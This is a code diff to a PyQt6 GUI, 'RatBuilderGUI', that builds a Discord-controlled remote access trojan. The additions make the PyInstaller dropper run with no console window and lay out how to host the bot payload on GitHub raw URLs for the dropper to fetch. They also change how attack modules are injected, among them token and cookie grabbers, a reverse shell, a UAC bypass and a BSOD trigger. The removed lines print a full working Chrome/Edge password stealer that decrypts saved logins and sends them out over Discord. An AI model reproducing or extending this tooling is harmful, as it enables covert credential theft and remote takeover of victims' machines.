@@ -8,6 +8,7 @@ from PyQt6.QtWidgets import (QApplication, QMainWindow, QVBoxLayout, QHBoxLayout
                              QGroupBox, QMessageBox, QFrame, QTextEdit,QInputDialog)
 from PyQt6.QtCore import Qt
 from PyQt6.QtGui import QFont, QPalette, QColor
+
 class RatBuilderGUI(QMainWindow):
     def __init__(self):
         super().__init__()
@@ -286,6 +287,7 @@ class RatBuilderGUI(QMainWindow):
             cmd = [
                 sys.executable, '-m', 'PyInstaller',
                 '--onefile',
+                '--noconsole',
                 '--name', 'sendthis',
                 '--distpath', build_dir,
                 dropper_py_path
@@ -294,6 +296,7 @@ class RatBuilderGUI(QMainWindow):
             cmd = [
                 pyinstaller_cmd,
                 '--onefile',
+                '--noconsole',
                 '--name', 'sendthis',
                 '--distpath', build_dir,
                 dropper_py_path
@@ -318,6 +321,7 @@ class RatBuilderGUI(QMainWindow):
         
         self.output_text.append("✅ Dropper built: sendthis.exe")
         return dropper_exe_path
+    
     def select_all_commands(self):
         for checkbox in self.commands.values():
             checkbox.setChecked(True)
@@ -365,19 +369,26 @@ class RatBuilderGUI(QMainWindow):
             # Step 2: Show instructions for uploading to GitHub
             self.output_text.append("📤 STEP 2: UPLOAD TO GITHUB")
             self.output_text.append("=" * 50)
-            self.output_text.append("1. Upload the main bot Python file to GitHub")
-            self.output_text.append("2. Get the RAW file URL (right-click 'Raw' button -> Copy link)")
-            self.output_text.append("3. The URL should look like:")
-            self.output_text.append("   https://raw.githubusercontent.com/username/repo/main/filename.py")
+            self.output_text.append("1. Create a NEW GitHub repository (public or private)")
+            self.output_text.append("2. Upload the main bot Python file to the repository")
+            self.output_text.append("3. Click on the file, then click 'Raw' button")
+            self.output_text.append("4. Copy the RAW URL from your browser address bar")
+            self.output_text.append("5. The URL should look like:")
+            self.output_text.append("   https://raw.githubusercontent.com/yourusername/yourrepo/main/yourfile.py")
             self.output_text.append("")
             self.output_text.append("Paste the GitHub RAW URL below:")
             self.output_text.append("")
 
             # Get GitHub URL from user
             github_url, ok = QInputDialog.getText(self, 'GitHub RAW URL', 
-                                                'Paste the GitHub RAW URL:')
+                                                'Paste the FULL GitHub RAW URL:')
             if not ok or not github_url.strip():
                 QMessageBox.warning(self, 'Error', 'GitHub RAW URL is required!')
+                return
+
+            # Validate GitHub URL
+            if not github_url.startswith('https://raw.githubusercontent.com/'):
+                QMessageBox.warning(self, 'Error', 'Please provide a valid GitHub RAW URL!')
                 return
 
             # Step 3: Build the dropper EXE
@@ -442,7 +453,7 @@ class RatBuilderGUI(QMainWindow):
         
         self.output_text.append("Generating command implementations...")
         
-        # Generate command definitions
+        # Generate command definitions with proper formatting
         command_definitions = []
 
         for command_name in selected_commands:
@@ -467,310 +478,113 @@ class RatBuilderGUI(QMainWindow):
                 with open(command_path, 'r', encoding='utf-8') as f:
                     command_code = f.read().strip()
                 
-                # Special handling for pass_light to avoid indentation issues
-                if command_name == 'pass_light':
-                    command_definitions.append(f"""
-    @bot.command()
-    @is_correct_user_channel()
-    async def {command_name}(ctx):
-        \"\"\"Light password grabber for Chrome and Edge\"\"\"
-        import os
-        import json
-        import base64
-        import sqlite3
-        import win32crypt
-        from Crypto.Cipher import AES
-        import shutil
-        import time
-        from datetime import datetime, timedelta
-        import zipfile
-        
-        async def upload_to_discord(data, ctx):
-            try:
-                # Save passwords to file
-                temp_dir = os.environ['TEMP']
-                passwords_file = os.path.join(temp_dir, 'passwords.txt')
-                zip_file = os.path.join(temp_dir, 'passwords.zip')
+                # Properly format the command with correct indentation
+                formatted_command = self.format_command_code(command_name, command_code)
+                command_definitions.append(formatted_command)
                 
-                with open(passwords_file, 'w', encoding='utf-8') as f:
-                    if data:
-                        for url, credentials in data.items():
-                            username, password = credentials
-                            f.write(f"URL: {{url}}\\n")
-                            f.write(f"Username: {{username}}\\n")
-                            f.write(f"Password: {{password}}\\n")
-                            f.write("-" * 50 + "\\n")
-                    else:
-                        f.write("No passwords found\\n")
-                
-                # Create zip file
-                with zipfile.ZipFile(zip_file, 'w') as zipf:
-                    zipf.write(passwords_file, 'passwords.txt')
-                
-                # Send the zip file
-                with open(zip_file, 'rb') as f:
-                    await ctx.send(file=discord.File(f, "passwords.zip"))
-                
-                # Clean up
-                if os.path.exists(passwords_file):
-                    os.remove(passwords_file)
-                if os.path.exists(zip_file):
-                    os.remove(zip_file)
-                    
-            except Exception as e:
-                await ctx.send(f"Upload error: {{str(e)}}")
-        
-        def get_master_key():
-            try:
-                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Local State', "r", encoding='utf-8') as f:
-                    local_state = f.read()
-                    local_state = json.loads(local_state)
-            except: 
-                return None
-            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-            return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-        
-        def decrypt_password_edge(buff, master_key):
-            try:
-                iv = buff[3:15]
-                payload = buff[15:]
-                cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                decrypted_pass = cipher.decrypt(payload)
-                decrypted_pass = decrypted_pass[:-16].decode()
-                return decrypted_pass
-            except Exception as e: 
-                return "Chrome < 80"
-        
-        def get_passwords_edge():
-            master_key = get_master_key()
-            if not master_key:
-                return {{}}
-                
-            login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
-            if not os.path.exists(login_db):
-                return {{}}
-                
-            try: 
-                shutil.copy2(login_db, "Loginvault.db")
-            except: 
-                return {{}}
-                
-            conn = sqlite3.connect("Loginvault.db")
-            cursor = conn.cursor()
-
-            result = {{}}
-            try:
-                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                for r in cursor.fetchall():
-                    url = r[0]
-                    username = r[1]
-                    encrypted_password = r[2]
-                    decrypted_password = decrypt_password_edge(encrypted_password, master_key)
-                    if username != "" or decrypted_password != "":
-                        result[url] = [username, decrypted_password]
-            except: 
-                pass
-
-            cursor.close()
-            conn.close()
-            try: 
-                os.remove("Loginvault.db")
-            except Exception as e: 
-                pass
-                
-            return result
-
-        def get_encryption_key():
-            try:
-                local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-                with open(local_state_path, "r", encoding="utf-8") as f:
-                    local_state = f.read()
-                    local_state = json.loads(local_state)
-
-                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-            except: 
-                return None
-
-        def decrypt_password_chrome(password, key):
-            try:
-                iv = password[3:15]
-                password = password[15:]
-                cipher = AES.new(key, AES.MODE_GCM, iv)
-                return cipher.decrypt(password)[:-16].decode()
-            except:
-                try: 
-                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-                except: 
-                    return ""
-
-        def get_chrome_passwords():
-            key = get_encryption_key()
-            if not key:
-                return {{}}
-                
-            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
-            if not os.path.exists(db_path):
-                return {{}}
-                
-            file_name = "ChromeData.db"
-            shutil.copyfile(db_path, file_name)
-            db = sqlite3.connect(file_name)
-            cursor = db.cursor()
-            
-            result = {{}}
-            try:
-                cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-                for row in cursor.fetchall():
-                    action_url = row[1]
-                    username = row[2]
-                    password = decrypt_password_chrome(row[3], key)
-                    if username or password:
-                        result[action_url] = [username, password]
-            except: 
-                pass
-                
-            cursor.close()
-            db.close()
-            try: 
-                os.remove(file_name)
-            except: 
-                pass
-                
-            return result
-
-        def grab_passwords():
-            result = {{}}
-            
-            # Get Chrome passwords
-            try: 
-                chrome_passwords = get_chrome_passwords()
-                result.update(chrome_passwords)
-            except: 
-                pass
-
-            # Get Edge passwords  
-            try: 
-                edge_passwords = get_passwords_edge()
-                result.update(edge_passwords)
-            except: 
-                pass
-            
-            return result
-
-        try:
-            await ctx.send("🔍 Starting password collection...")
-            
-            passwords_data = grab_passwords()
-            
-            if passwords_data:
-                await upload_to_discord(passwords_data, ctx)
-                
-                # Send completion message
-                embed = discord.Embed(
-                    title="🔑 Password Grabber - Light",
-                    description=f"Successfully collected {{len(passwords_data)}} sets of credentials",
-                    colour=discord.Colour.green()
-                )
-                await ctx.send(embed=embed)
+                self.output_text.append(f"✅ Added command: {command_name}")
             else:
-                embed = discord.Embed(
-                    title="🔑 Password Grabber - Light",
-                    description="No passwords found in Chrome or Edge browsers",
-                    colour=discord.Colour.orange()
-                )
-                await ctx.send(embed=embed)
-                
-        except Exception as e:
-            embed = discord.Embed(
-                title="❌ Password Grabber - Light",
-                description=f"Error: {{str(e)}}",
-                colour=discord.Colour.red()
-            )
-            await ctx.send(embed=embed)
-    """)
-                else:
-                    # Add command definition WITH the user channel check decorator for other commands
-                    command_definitions.append(f"""
-    @bot.command()
-    @is_correct_user_channel()
-    async def {command_name}(ctx):
-    {self.indent_code(command_code)}
-    """)
-                self.output_text.append(f"Added command: {command_name}")
-            else:
-                self.output_text.append(f"Warning: Command file not found: {command_path}")
+                self.output_text.append(f"❌ Command file not found: {command_path}")
 
-        # Remove placeholder command definitions (the ones at the bottom of the file)
-        placeholder_commands = [
-            '@bot.command()\nasync def tkn_grab(ctx):#done\n    filename="discord_token_grabber.py"',
-            '@bot.command()\nasync def bsod(ctx):#done\n    filename="bsod.py"',
-            '@bot.command()\nasync def get_cookies(ctx):#done\n    filename="get_cookies.py"',
-            '@bot.command()\nasync def pass_light(ctx):#done\n    filename="passwords_grabber.py"',
-            '@bot.command()\nasync def pass_heavy(ctx,bot_k,cat_id):#done\n    filename="gruppe.py"',
-            '@bot.command()\nasync def reverse_shell(ctx):#done\n    filename="reverse_shell"',
-            '@bot.comnand()\nasync def uac(ctx):\n    filename="uac_bypass.py"'
+        # Remove all placeholder command definitions using a more robust method
+        import re
+        
+        # Remove placeholder commands using regex patterns
+        placeholder_patterns = [
+            r'@bot\.command\(\)\s*\n\s*async def tkn_grab\(ctx\):#done.*?\n.*?filename="discord_token_grabber\.py"',
+            r'@bot\.command\(\)\s*\n\s*async def bsod\(ctx\):#done.*?\n.*?filename="bsod\.py"',
+            r'@bot\.command\(\)\s*\n\s*async def get_cookies\(ctx\):#done.*?\n.*?filename="get_cookies\.py"',
+            r'@bot\.command\(\)\s*\n\s*async def pass_light\(ctx\):#done.*?\n.*?filename="passwords_grabber\.py"',
+            r'@bot\.command\(\)\s*\n\s*async def pass_heavy\(ctx,bot_k,cat_id\):#done.*?\n.*?filename="gruppe\.py"',
+            r'@bot\.command\(\)\s*\n\s*async def reverse_shell\(ctx\):#done.*?\n.*?filename="reverse_shell"',
+            r'@bot\.comnand\(\)\s*\n\s*async def uac\(ctx\):.*?\n.*?filename="uac_bypass\.py"'
         ]
         
-        for placeholder in placeholder_commands:
-            template_content = template_content.replace(placeholder, '')
+        for pattern in placeholder_patterns:
+            template_content = re.sub(pattern, '', template_content, flags=re.DOTALL)
         
-        # Also remove individual lines if the multi-line approach doesn't catch them
-        template_content = template_content.replace('@bot.command()\nasync def tkn_grab(ctx):#done', '')
-        template_content = template_content.replace('    filename="discord_token_grabber.py"', '')
-        template_content = template_content.replace('@bot.command()\nasync def bsod(ctx):#done', '')
-        template_content = template_content.replace('    filename="bsod.py"', '')
-        template_content = template_content.replace('@bot.command()\nasync def get_cookies(ctx):#done', '')
-        template_content = template_content.replace('    filename="get_cookies.py"', '')
-        template_content = template_content.replace('@bot.command()\nasync def pass_light(ctx):#done', '')
-        template_content = template_content.replace('    filename="passwords_grabber.py"', '')
-        template_content = template_content.replace('@bot.command()\nasync def pass_heavy(ctx,bot_k,cat_id):#done', '')
-        template_content = template_content.replace('    filename="gruppe.py"', '')
-        template_content = template_content.replace('@bot.command()\nasync def reverse_shell(ctx):#done', '')
-        template_content = template_content.replace('    filename="reverse_shell"', '')
-        template_content = template_content.replace('@bot.comnand()\nasync def uac(ctx):', '')
-        template_content = template_content.replace('    filename="uac_bypass.py"', '')
+        # Clean up any empty lines caused by removal
+        template_content = re.sub(r'\n\s*\n\s*\n', '\n\n', template_content)
         
-        # Insert command definitions before the final bot execution
-        commands_section = '\n'.join(command_definitions)
-        
-        # Find the position to insert commands (before the final bot execution code)
-        # Look for the comment that marks where commands should be inserted
-        commands_marker = "# Commands are added by the builder above this line"
-        
-        if commands_marker in template_content:
-            template_content = template_content.replace(
-                commands_marker, 
-                commands_section + '\n\n' + commands_marker
-            )
-        else:
-            # Fallback: insert before the final bot execution
-            final_execution_marker = "decoded_token = decode_token(ENCODED_TOKEN)"
-            if final_execution_marker in template_content:
+        # Insert command definitions in the correct location
+        if command_definitions:
+            commands_section = '\n\n'.join(command_definitions)
+            
+            # Find the insertion point - look for the marker or create one
+            insertion_marker = "# Commands are added by the builder above this line"
+            
+            if insertion_marker in template_content:
+                # Insert commands right before the marker
                 template_content = template_content.replace(
-                    final_execution_marker,
-                    commands_section + '\n\n' + final_execution_marker
+                    insertion_marker, 
+                    commands_section + '\n\n' + insertion_marker
                 )
+                self.output_text.append("✅ Commands inserted before execution code")
             else:
-                # Last resort: append before last few lines
-                lines = template_content.split('\n')
-                insert_position = max(0, len(lines) - 10)  # Insert before last 10 lines
-                lines.insert(insert_position, commands_section)
-                template_content = '\n'.join(lines)
+                # Look for the bot.run section and insert before it
+                bot_run_pattern = r'bot\.run\(.*?\)'
+                if re.search(bot_run_pattern, template_content):
+                    # Insert before bot.run
+                    template_content = re.sub(
+                        bot_run_pattern,
+                        commands_section + '\n\n' + re.search(bot_run_pattern, template_content).group(),
+                        template_content
+                    )
+                    self.output_text.append("✅ Commands inserted before bot.run")
+                else:
+                    # Emergency fallback: insert before last 10 lines
+                    lines = template_content.split('\n')
+                    insert_pos = max(0, len(lines) - 10)
+                    lines.insert(insert_pos, '\n\n' + commands_section + '\n\n')
+                    template_content = '\n'.join(lines)
+                    self.output_text.append("⚠️ Commands inserted using fallback method")
+        else:
+            self.output_text.append("⚠️ No commands to insert")
         
         # Write the final bot file to build directory
         python_filename = os.path.join(build_dir, f"{output_filename}.py")
         with open(python_filename, 'w', encoding='utf-8') as f:
             f.write(template_content)
         
-        self.output_text.append(f"Generated Python file: {os.path.basename(python_filename)}")
+        self.output_text.append(f"✅ Generated Python file: {os.path.basename(python_filename)}")
         return python_filename
 
-    def indent_code(self, code):
-        """Indent code for proper Python formatting"""
+    def format_command_code(self, command_name, code):
+        """Properly format command code with correct Python indentation and handle different signatures"""
+        # Define command signatures
+        command_signatures = {
+            'tkn_grab': 'ctx',
+            'bsod': 'ctx', 
+            'get_cookies': 'ctx',
+            'pass_light': 'ctx',
+            'pass_heavy': 'ctx, bot_k, cat_id',
+            'reverse_shell': 'ctx',
+            'uac': 'ctx'
+        }
+        
+        signature = command_signatures.get(command_name, 'ctx')
+        
         lines = code.split('\n')
-        indented_lines = ['    ' + line for line in lines]
-        return '\n'.join(indented_lines)
+        formatted_lines = []
+        
+        # Add the command decorator and function definition
+        formatted_lines.append(f"@bot.command()")
+        formatted_lines.append(f"@is_correct_user_channel()")
+        formatted_lines.append(f"async def {command_name}({signature}):")
+        
+        # Add the command code with proper indentation
+        for line in lines:
+            if line.strip():  # Only process non-empty lines
+                # Handle different indentations in source files
+                stripped_line = line.lstrip()
+                indent_level = len(line) - len(stripped_line)
+                # Convert to 4-space indentation
+                formatted_indent = '    ' + ' ' * (indent_level)
+                formatted_lines.append(formatted_indent + stripped_line)
+            else:
+                formatted_lines.append("")  # Keep empty lines
+        
+        return '\n'.join(formatted_lines)
     
     def find_pyinstaller(self):
         """Find PyInstaller executable in system PATH or common locations"""
